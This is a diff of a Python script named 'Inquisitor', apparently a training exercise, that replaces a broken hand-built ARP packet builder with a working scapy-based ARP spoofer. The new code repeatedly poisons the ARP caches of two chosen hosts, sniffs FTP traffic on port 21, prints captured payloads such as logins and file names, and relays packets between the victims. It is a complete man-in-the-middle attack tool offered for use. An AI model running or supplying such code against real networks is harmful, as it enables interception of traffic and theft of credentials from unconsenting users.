@@ -1,91 +1,112 @@
 #!/usr/bin/env python3
 
-import argparse, sys, socket
-from pcap import sniff, sendpacket
-from struct import unpack
+import argparse, os, sys, signal, pcapy, threading, socket
+import scapy.all as scapy
+from getmac import get_mac_address
 
 
-def check_ipv4(ip):
-    try:
-        socket.inet_pton(socket.AF_INET, ip)
-        return True
-    except OSError:
-        return False
+def ft_is_forward_activated():
+    with open("/proc/sys/net/ipv4/ip_forward", "rt") as file:
+        readed = file.read()
+        if "1\n" == readed:
+            return True
+    return False
 
 
-def create_arp_request(src_ip, src_mac, target_ip, target_mac):
-    ether_header = b'\xff\xff\xff\xff\xff\xff'
-    ether_header += src_mac.encode()
-    ether_type = 0x0806
-    ether_header += ether_type.to_bytes(2, byteorder='big')
+class Spoofer(threading.Thread):
+    class SpooferRefresh(threading.Thread):
+        def __init__(self, event, ip_src, mac_src, ip_dst, mac_dst, mac_origin) -> None:
+            super().__init__()
+            self.event = event
+            self.ip_src = ip_src
+            self.mac_src = mac_src
+            self.ip_dst = ip_dst
+            self.mac_dst = mac_dst
+            self.hostname = socket.gethostname()
+            self.ip_address = socket.gethostbyname(self.hostname)
+            self.mac = mac_origin
 
-    arp_header = b'\x00\x01'
-    arp_header += b'\x00\x02'
-    arp_header += b'\x00\x00\x00\x00\x00\x00'
-    arp_header += b'\x00\x00\x00\x00\x00\x00'
-    arp_header += b'\x00\x00\x00\x00'
-    arp_header += src_mac.encode() * 6
-    arp_header += src_ip.to_bytes(4, byteorder='big')
-    arp_header += target_mac.encode() * 6
-    arp_header += target_ip.to_bytes(4, byteorder='big')
+        def run(self):
+            seconds_to_spoof = 10
+            while not self.event.is_set():
+                print("ARP spoofing", flush=True)
+                Spoofer.SpooferRefresh.ft_spoof(self.ip_src, self.ip_dst, self.mac_dst)
+                Spoofer.SpooferRefresh.ft_spoof(self.ip_dst, self.ip_src, self.mac_src)
+                self.event.wait(seconds_to_spoof)
 
-    arp_request = ether_header + arp_header
+            Spoofer.SpooferRefresh.ft_restore(self.ip_dst, self.mac_dst, self.ip_src, self.mac_src)
+            Spoofer.SpooferRefresh.ft_restore(self.ip_src, self.mac_src, self.ip_dst, self.mac_dst)
 
-    return arp_request
+        @staticmethod
+        def ft_spoof(ip_origin, ip_dest, mac_dest):
+            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst=ip_dest, hwdst=mac_dest, psrc=ip_origin)), verbose=0)
+            scapy.send(scapy.ARP(op=2, pdst=ip_dest, hwdst=mac_dest, psrc=ip_origin), verbose=0)
 
-
-def create_arp_reply(src_ip, src_mac, target_mac, target_ip):
-    ether_header = b'\x00\x00\x00\x00\x00\x00'
-    ether_header += src_mac.encode()
-    ether_type = 0x0806
-    ether_header += ether_type.to_bytes(2, byteorder='big')
-
-    arp_header = b'\x00\x02'
-    arp_header += b'\x00\x04'
-    arp_header += b'\x06\x00\x00\x00\x00\x00'
-    arp_header += b'\x04\x00\x00\x00\x00\x00'
-    arp_header += b'\x00\x00\x00\x00'
-    arp_header += src_mac.encode() * 6
-    arp_header += src_ip.to_bytes(4, byteorder='big')
-    arp_header += target_mac.encode() * 6
-    arp_header += target_ip.to_bytes(4, byteorder='big')
-
-    arp_reply = ether_header + arp_header
-
-    return arp_reply
+        @staticmethod
+        def ft_restore(ip_origin, mac_origin, ip_dest, mac_dest):
+            scapy.sendp((scapy.Ether(dst=mac_dest) / scapy.ARP(op=1, pdst=ip_dest, hwdst=mac_dest, psrc=ip_origin)), verbose=0)
+            scapy.send(scapy.ARP(op=2, pdst=ip_dest, hwdst=mac_dest, psrc=ip_origin, hwsrc=mac_origin), verbose=0)
 
 
-def poison_arp(interface, src_ip, src_mac, target_ip, target_mac):
-    arp_request = create_arp_request(src_ip, src_mac, target_ip, target_mac)
-    arp_reply = create_arp_reply(src_ip, src_mac, target_ip, target_mac)
+    def __init__(self, ip_src, mac_src, ip_dst, mac_dst) -> None:
+        super().__init__()
+        self.event = threading.Event()
+        self.mac = get_mac_address()
+        self.ip_src = ip_src
+        self.mac_src = mac_src
+        self.ip_dst = ip_dst
+        self.mac_dst = mac_dst
+        self.spoofer_refresher = Spoofer.SpooferRefresh(self.event, self.ip_src, self.mac_src, self.ip_dst, self.mac_dst, self.mac)
+        self.forwarding = ft_is_forward_activated()
+        self.pcap_listener = None
+        signal.signal(signal.SIGINT, self.catch)
+        signal.signal(signal.SIGTERM, self.catch)
+        signal.siginterrupt(signal.SIGINT, True)
 
-    while True:
-        packet = sniff(interface=interface, count=1)
-        if packet:
-            if packet.haslayer(arp.ARP) and packet[arp.ARP].op == arp.REQUEST:
-                if packet[arp.ARP].psrc == target_ip:
-                    sendpacket(packet, arp_reply)
-                elif packet[arp.ARP].pdst == target_ip:
-                    sendpacket(packet, arp_reply)
+    def catch(self, signum, frame):
+        print("\r", end="", flush=True)
+        print("Free the arp tables", flush=True)
+        self.event.set()
+        self.spoofer_refresher.join()
+        self.pcap_listener.close()
+        os._exit(0)
+
+    def run(self):
+        self.spoofer_refresher.start()
+        self.pcap_listener = pcapy.open_live("eth0", 2000, True, 1000)
+        self.pcap_listener.setfilter("port 21")
+        while True:
+            next_packet = self.pcap_listener.next()
+            self.ft_process_packet(scapy.Ether(next_packet[1]))
+
+    def ft_process_packet(self, packet):
+        if scapy.Raw in packet:
+            if packet[scapy.Ether].src!= self.mac:
+                info = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
+                print("Message captured", flush=True)
+                print(info, flush=True)
+                if not self.forwarding:
+                    packet.src = self.mac
+                    if packet[scapy.Ether].src == self.mac_src:
+                        packet.dst = self.mac_dst
+                    else:
+                        packet.dst = self.mac_src
+                    scapy.sendp(packet, verbose=0)
+            else:
+                print("Message forwarded\n", flush=True)
 
 
-def parse_arguments():
-    parser = argparse.ArgumentParser("Inquisitor")
-    parser.add_argument('IP_src', help="IP address of the source")
-    parser.add_argument('MAC_src', help="MAC address of the source")
-    parser.add_argument('IP_target', help="IP address of the target")
-    parser.add_argument('MAC_target', help="MAC address of the target")
+def ft_parser_args():
+    parser = argparse.ArgumentParser(description='ARP spoofer,./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
+    parser.add_argument('addresses', action='store', nargs=4, help="<IP-src> <MAC-src> <IP-target> <MAC-target>")
     return parser.parse_args()
 
 
 def main():
-    args = parse_arguments()
-    
-    if not check_ipv4(args.IP_src) or not check_ipv4(args.IP_target):
-        print("IP addresses must be IPv4 addresses")
-        sys.exit(1)
-
-    poison_arp('eth0', args.IP_src, args.MAC_src, args.IP_target, args.MAC_target)
+    args = ft_parser_args()
+    spoofer = Spoofer(args.addresses[0], args.addresses[1], args.addresses[2], args.addresses[3])
+    spoofer.start()
+    spoofer.join()
 
 
 if __name__ == "__main__":
